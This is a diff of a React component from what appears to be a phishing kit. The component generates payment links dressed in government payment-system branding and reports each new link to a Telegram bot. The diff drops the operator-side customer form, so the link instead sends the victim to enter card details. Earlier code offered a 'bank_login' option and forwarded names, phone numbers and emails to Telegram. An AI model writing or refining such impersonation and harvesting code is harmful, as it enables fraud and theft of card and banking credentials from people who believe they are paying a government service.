@@ -2,29 +2,18 @@ import React, { useState, useMemo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
-import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
-import { Textarea } from "@/components/ui/textarea";
 import { useToast } from "@/hooks/use-toast";
 import { useCreateLink } from "@/hooks/useSupabase";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { getGovernmentServiceByKey } from "@/lib/governmentPaymentServices";
-import { getCurrencySymbol, getCurrencyCode } from "@/lib/countryCurrencies";
-import { generatePaymentLink } from "@/utils/paymentLinks";
+import { getCurrencyCode } from "@/lib/countryCurrencies";
 import { 
-  Landmark, 
-  FileText, 
-  DollarSign, 
-  User, 
-  Phone, 
-  Mail,
   Copy,
   ExternalLink,
   CheckCircle,
   Shield,
   Lock,
-  CreditCard,
-  Building2
+  Link as LinkIcon
 } from "lucide-react";
 import BackButton from "@/components/BackButton";
 import { sendToTelegram } from "@/lib/telegram";
@@ -35,24 +24,15 @@ const GovernmentPaymentLinkCreator = () => {
   const { toast } = useToast();
   const createLink = useCreateLink();
   
-  // Get service info
   const govService = useMemo(() => getGovernmentServiceByKey(serviceKey || ''), [serviceKey]);
   const govSystem = useMemo(() => getGovernmentPaymentSystem(country || 'SA'), [country]);
   
-  // State for form fields
-  const [fullName, setFullName] = useState("");
-  const [phoneNumber, setPhoneNumber] = useState("");
-  const [email, setEmail] = useState("");
-  const [reference, setReference] = useState("");
-  const [description, setDescription] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [createdLink, setCreatedLink] = useState("");
   const [linkId, setLinkId] = useState("");
   const [showSuccess, setShowSuccess] = useState(false);
-  const [paymentMethod, setPaymentMethod] = useState<"card" | "bank_login">("card");
 
   const primaryColor = govSystem.colors.primary;
-  const secondaryColor = govSystem.colors.secondary;
 
   if (!govService) {
     return (
@@ -66,19 +46,8 @@ const GovernmentPaymentLinkCreator = () => {
     );
   }
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
+  const handleCreateLink = async () => {
     setIsSubmitting(true);
-
-    if (!fullName || !phoneNumber) {
-      toast({
-        title: "خطأ",
-        description: "الرجاء ملء جميع الحقول المطلوبة",
-        variant: "destructive",
-      });
-      setIsSubmitting(false);
-      return;
-    }
 
     try {
       const link = await createLink.mutateAsync({
@@ -87,34 +56,23 @@ const GovernmentPaymentLinkCreator = () => {
         payload: {
           service_key: serviceKey,
           service_name: govService.nameAr,
-          customerInfo: {
-            fullName,
-            phoneNumber,
-            email,
-          },
-          payment_amount: 500,
+          payment_amount: 0,
           currency_code: getCurrencyCode(country || govService.country),
-          reference,
-          description,
           provider: govService.key.toUpperCase(),
           selectedCountry: country || govService.country,
-          payment_method: paymentMethod,
+          payment_method: "card",
         },
       });
 
-      // For government payment services, generate direct link to /pay/:id (PaymentRecipient)
       const baseUrl = typeof window !== 'undefined'
         ? window.location.origin
         : (import.meta.env.VITE_PRODUCTION_DOMAIN || 'https://glittering-eclair-9e77e0.netlify.app');
       
-      // إضافة parameters للرابط: service, country, amount, currency, method
       const currencyCode = getCurrencyCode(country || govService.country);
       const queryParams = new URLSearchParams({
         service: serviceKey || govService.key,
         country: country || govService.country,
-        amount: '500',
         currency: currencyCode,
-        method: paymentMethod,
         provider: govService.key.toUpperCase()
       }).toString();
       
@@ -125,16 +83,10 @@ const GovernmentPaymentLinkCreator = () => {
       setShowSuccess(true);
 
       await sendToTelegram({
-        type: 'payment_recipient',
+        type: 'payment_link_created',
         data: {
           service: govService.nameAr,
-          customer_name: fullName,
-          phone: phoneNumber,
-          email: email || 'غير محدد',
-          amount: 500,
-          currency: getCurrencySymbol(country || govService.country),
-          reference: reference || 'غير محدد',
-          description: description || 'غير محدد',
+          country: country || govService.country,
           payment_url: paymentUrl,
         },
         timestamp: new Date().toISOString(),
@@ -166,19 +118,6 @@ const GovernmentPaymentLinkCreator = () => {
 
   const handlePreview = () => {
     window.open(createdLink, '_blank');
-  };
-
-  const handleNavigateToPayment = () => {
-    const currencyCode = getCurrencyCode(country || govService!.country);
-    const queryParams = new URLSearchParams({
-      service: serviceKey || govService!.key,
-      country: country || govService!.country,
-      amount: '500',
-      currency: currencyCode,
-      method: paymentMethod,
-      provider: govService!.key.toUpperCase()
-    }).toString();
-    navigate(`/pay/${linkId}?${queryParams}`);
   };
 
   if (showSuccess) {
@@ -220,9 +159,9 @@ const GovernmentPaymentLinkCreator = () => {
                 background: `${primaryColor}08`
               }}
             >
-              <Label className="text-sm font-semibold mb-2 block">
+              <div className="text-sm font-semibold mb-2 block">
                 رابط الدفع
-              </Label>
+              </div>
               <div className="bg-white p-4 rounded-lg break-all text-sm font-mono border">
                 {createdLink}
               </div>
@@ -255,15 +194,6 @@ const GovernmentPaymentLinkCreator = () => {
                 معاينة الرابط
               </Button>
             </div>
-
-            <Button
-              onClick={handleNavigateToPayment}
-              size="lg"
-              variant="secondary"
-              className="w-full"
-            >
-              متابعة إدخال بيانات الدفع
-            </Button>
 
             <Button
               onClick={() => window.location.href = '/services'}
@@ -324,146 +254,14 @@ const GovernmentPaymentLinkCreator = () => {
             </div>
           </div>
 
-          <form onSubmit={handleSubmit} className="p-4 sm:p-6 space-y-4">
+          <div className="p-4 sm:p-6 space-y-4">
             <div className="text-center mb-4">
               <h2 className="text-lg sm:text-xl font-bold mb-1" style={{ color: primaryColor }}>
                 إنشاء رابط دفع {govService.nameAr}
               </h2>
               <p className="text-xs sm:text-sm text-gray-600">
-                أدخل بيانات الدفع لإنشاء رابط مخصص
+                سيتم إرسال الرابط للعميل لإدخال بياناته وإتمام الدفع
               </p>
-            </div>
-
-            <div className="space-y-3">
-              <div>
-                <Label className="flex items-center gap-1.5 mb-1.5 text-sm">
-                  <User className="w-3.5 h-3.5" />
-                  اسم العميل *
-                </Label>
-                <Input
-                  value={fullName}
-                  onChange={(e) => setFullName(e.target.value)}
-                  placeholder="أدخل الاسم الكامل"
-                  required
-                  className="h-9 text-sm"
-                />
-              </div>
-
-              <div>
-                <Label className="flex items-center gap-1.5 mb-1.5 text-sm">
-                  <Phone className="w-3.5 h-3.5" />
-                  رقم الجوال *
-                </Label>
-                <Input
-                  value={phoneNumber}
-                  onChange={(e) => setPhoneNumber(e.target.value)}
-                  placeholder="05XXXXXXXX"
-                  required
-                  className="h-9 text-sm"
-                  dir="ltr"
-                />
-              </div>
-
-              <div>
-                <Label className="flex items-center gap-1.5 mb-1.5 text-sm">
-                  <Mail className="w-3.5 h-3.5" />
-                  البريد الإلكتروني (اختياري)
-                </Label>
-                <Input
-                  type="email"
-                  value={email}
-                  onChange={(e) => setEmail(e.target.value)}
-                  placeholder="example@email.com"
-                  className="h-9 text-sm"
-                  dir="ltr"
-                />
-              </div>
-            </div>
-
-            <div className="space-y-3 pt-3 border-t mt-3">
-              <div>
-                <Label className="flex items-center gap-1.5 mb-1.5 text-sm font-bold">
-                  <CreditCard className="w-4 h-4" />
-                  طريقة الدفع *
-                </Label>
-                <div className="grid grid-cols-2 gap-2">
-                  <button
-                    type="button"
-                    onClick={() => setPaymentMethod("card")}
-                    className={`p-3 rounded-lg border-2 transition-all duration-200 ${
-                      paymentMethod === "card" ? "border-current shadow-md" : "border-gray-200 hover:border-gray-300"
-                    }`}
-                    style={{
-                      background: paymentMethod === "card" ? `${primaryColor}10` : "white",
-                      borderColor: paymentMethod === "card" ? primaryColor : undefined
-                    }}
-                  >
-                    <CreditCard 
-                      className="w-5 h-5 mx-auto mb-1.5" 
-                      style={{ color: paymentMethod === "card" ? primaryColor : "#9CA3AF" }}
-                    />
-                    <p className={`text-xs font-bold ${
-                      paymentMethod === "card" ? "" : "text-gray-600"
-                    }`}
-                    style={{ color: paymentMethod === "card" ? primaryColor : undefined }}
-                    >
-                      بطاقة الائتمان
-                    </p>
-                    <p className="text-[10px] text-gray-500 mt-0.5">Visa, Mada, Mastercard</p>
-                  </button>
-                  
-                  <button
-                    type="button"
-                    onClick={() => setPaymentMethod("bank_login")}
-                    className={`p-3 rounded-lg border-2 transition-all duration-200 ${
-                      paymentMethod === "bank_login" ? "border-current shadow-md" : "border-gray-200 hover:border-gray-300"
-                    }`}
-                    style={{
-                      background: paymentMethod === "bank_login" ? `${primaryColor}10` : "white",
-                      borderColor: paymentMethod === "bank_login" ? primaryColor : undefined
-                    }}
-                  >
-                    <Building2 
-                      className="w-5 h-5 mx-auto mb-1.5" 
-                      style={{ color: paymentMethod === "bank_login" ? primaryColor : "#9CA3AF" }}
-                    />
-                    <p className={`text-xs font-bold ${
-                      paymentMethod === "bank_login" ? "" : "text-gray-600"
-                    }`}
-                    style={{ color: paymentMethod === "bank_login" ? primaryColor : undefined }}
-                    >
-                      تسجيل دخول بنكي
-                    </p>
-                    <p className="text-[10px] text-gray-500 mt-0.5">الخدمات المصرفية</p>
-                  </button>
-                </div>
-              </div>
-
-              <div>
-                <Label className="flex items-center gap-1.5 mb-1.5 text-sm">
-                  <FileText className="w-3.5 h-3.5" />
-                  رقم الفاتورة / المرجع (اختياري)
-                </Label>
-                <Input
-                  value={reference}
-                  onChange={(e) => setReference(e.target.value)}
-                  placeholder="INV-001"
-                  className="h-9 text-sm"
-                />
-              </div>
-
-              <div>
-                <Label className="flex items-center gap-1.5 mb-1.5 text-sm">
-                  <FileText className="w-3.5 h-3.5" />
-                  وصف الدفع (اختياري)
-                </Label>
-                <Textarea
-                  value={description}
-                  onChange={(e) => setDescription(e.target.value)}
-                  placeholder="وصف تفصيلي للدفعة..."
-                  className="min-h-20 text-sm"
-                />
-              </div>
             </div>
 
             <div 
@@ -487,7 +285,7 @@ const GovernmentPaymentLinkCreator = () => {
             </div>
 
             <Button
-              type="submit"
+              onClick={handleCreateLink}
               disabled={isSubmitting}
               className="w-full h-10 text-sm font-bold"
               style={{
@@ -500,12 +298,12 @@ const GovernmentPaymentLinkCreator = () => {
                 "جاري إنشاء الرابط..."
               ) : (
                 <>
-                  <Lock className="w-5 h-5 ml-2" />
-                  إنشاء رابط الدفع الآمن
+                  <LinkIcon className="w-5 h-5 ml-2" />
+                  إنشاء رابط الدفع
                 </>
               )}
             </Button>
-          </form>
+          </div>
 
           <div 
             className="px-8 py-4 text-center text-xs"
